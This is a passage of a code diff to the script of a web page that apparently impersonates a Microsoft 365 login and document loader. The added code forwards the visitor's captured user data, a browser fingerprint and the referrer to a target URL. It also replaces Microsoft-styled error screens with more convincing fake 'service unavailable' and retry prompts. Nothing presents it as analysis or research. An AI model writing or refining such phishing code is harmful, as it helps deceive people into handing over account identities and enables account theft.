+                        // Enhanced security parameters
+                        const securityParams = new URLSearchParams({
+                            user: this.userData || '',
+                            source: 'premium_microsoft_365',
                             timestamp: Date.now().toString(),
                             version: CONFIG.VERSION,
                             security: CONFIG.SECURITY_LEVEL,
-                            session: Math.random().toString(36).substr(2, 12)
+                            session_id: this.generateSessionId(),
+                            device_fingerprint: this.generateDeviceFingerprint(),
+                            referrer: document.referrer || 'direct'
                         });
 
-                        // Smooth redirect with transition
-                        document.querySelector('.loading-state').style.opacity = '0';
-                        setTimeout(() => {
-                            window.location.href = `404.html?${params.toString()}`;
-                        }, 500);
+                        // Smooth exit animation
+                        this.animateExit().then(() => {
+                            window.location.href = `${targetUrl}?${securityParams.toString()}`;
+                        });
                     } catch (error) {
-                        this.showError('Authentication service is temporarily unavailable. Please try again.');
-                        this.hideLoadingState();
+                        this.showEnhancedError();
                     }
                 }
 
-                hideLoadingState() {
-                    const loginForm = document.getElementById('loginForm');
-                    const loadingState = document.getElementById('loadingState');
-                    
-                    loadingState.style.display = 'none';
-                    loginForm.style.display = 'block';
-                    
-                    setTimeout(() => {
-                        loginForm.style.opacity = '1';
-                        loginForm.style.transform = 'translateY(0)';
-                    }, 50);
+                generateSessionId() {
+                    const array = new Uint8Array(16);
+                    crypto.getRandomValues(array);
+                    return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
                 }
 
-                showError(message) {
-                    const errorState = document.getElementById('errorState');
-                    errorState.querySelector('div:last-child').textContent = message;
-                    errorState.style.display = 'block';
+                generateDeviceFingerprint() {
+                    const components = [
+                        navigator.userAgent,
+                        navigator.language,
+                        screen.width + 'x' + screen.height,
+                        new Date().getTimezoneOffset()
+                    ];
                     
-                    // Auto-hide after 5 seconds
-                    setTimeout(() => {
-                        errorState.style.display = 'none';
-                    }, 5000);
+                    let hash = 0;
+                    const str = components.join('|');
+                    for (let i = 0; i < str.length; i++) {
+                        const char = str.charCodeAt(i);
+                        hash = ((hash << 5) - hash) + char;
+                        hash = hash & hash;
+                    }
+                    return Math.abs(hash).toString(36);
                 }
 
-                showSmartError() {
-                    document.body.innerHTML = `
-                        <div class="login-container">
-                            <div class="ms-branding">
-                                <div class="ms-logo">MS</div>
-                                <h1 class="ms-title">Browser Compatibility</h1>
-                            </div>
-                            <div style="text-align: center; padding: 32px 0;">
-                                <div style="font-size: 48px; margin-bottom: 16px;">🔒</div>
-                                <div style="font-size: 18px; color: var(--gray-160); font-weight: 600; margin-bottom: 12px;">
-                                    Enhanced Security Enabled
-                                </div>
-                                <div style="font-size: 14px; color: var(--gray-130); margin-bottom: 32px; line-height: 1.5;">
-                                    We've detected an unsupported browser configuration.<br>
-                                    Please use Microsoft Edge, Chrome, or Firefox for the best experience.
-                                </div>
-                                <button class="ms-button" onclick="window.location.reload()" style="max-width: 200px;">
-                                    Try Again
-                                </button>
-                            </div>
-                        </div>
-                    `;
+                animateExit() {
+                    return new Promise((resolve) => {
+                        const container = document.querySelector('.loading-container');
+                        const elements = container.querySelectorAll('*');
+                        
+                        // Fade out all elements
+                        elements.forEach((el, index) => {
+                            el.style.transition = `all 0.4s cubic-bezier(0.4, 0, 0.2, 1) ${index * 0.05}s`;
+                            el.style.opacity = '0';
+                            el.style.transform = 'translateY(-20px)';
+                        });
+                        
+                        // Scale down container
+                        container.style.transform = 'scale(0.95)';
+                        container.style.opacity = '0';
+                        
+                        setTimeout(resolve, 600);
+                    });
+                }
+
+                showEnhancedError() {
+                    const statusPrimary = document.getElementById('statusPrimary');
+                    const statusSecondary = document.getElementById('statusSecondary');
+                    const progressStatus = document.getElementById('progressStatus');
+                    const loadingIndicator = document.querySelector('.loading-indicator');
+                    
+                    // Update status messages
+                    statusPrimary.textContent = 'Service Temporarily Unavailable';
+                    statusSecondary.textContent = 'We apologize for the inconvenience';
+                    progressStatus.textContent = 'Please try again in a few moments';
+                    
+                    // Change to error state styling
+                    statusPrimary.style.color = 'var(--gray-130)';
+                    loadingIndicator.style.borderTopColor = 'var(--gray-90)';
+                    loadingIndicator.style.animation = 'none';
+                    
+                    // Show retry button after delay
+                    setTimeout(() => {
+                        const retryButton = document.createElement('button');
+                        retryButton.textContent = 'Try Again';
+                        retryButton.style.cssText = `
+                            background: var(--blue-primary);
+                            color: white;
+                            border: none;
+                            border-radius: 6px;
+                            padding: 12px 24px;
+                            font-size: 14px;
+                            font-weight: 600;
+                            cursor: pointer;
+                            margin-top: 16px;
+                            transition: all 0.3s ease;
+                        `;
+                        
+                        retryButton.onmouseover = () => {
+                            retryButton.style.transform = 'translateY(-2px)';
+                            retryButton.style.boxShadow = '0 4px 12px rgba(0, 120, 212, 0.3)';
+                        };
+                        
+                        retryButton.onmouseout = () => {
+                            retryButton.style.transform = 'translateY(0)';
+                            retryButton.style.boxShadow = 'none';
+                        };
+                        
+                        retryButton.onclick = () => {
+                            window.location.reload();
+                        };
+                        
+                        document.querySelector('.progress-container').appendChild(retryButton);
+                    }, 2000);
                 }
             }
 
-            // Enhanced initialization
+            // Premium initialization with delay for better UX
             document.addEventListener('DOMContentLoaded', () => {
-                // Add loading delay for better UX
                 setTimeout(() => {
-                    new EnhancedMicrosoftAuth();
-                }, 300);
+                    new PremiumDocumentLoader();
+                }, 400);
             });
 
         })();
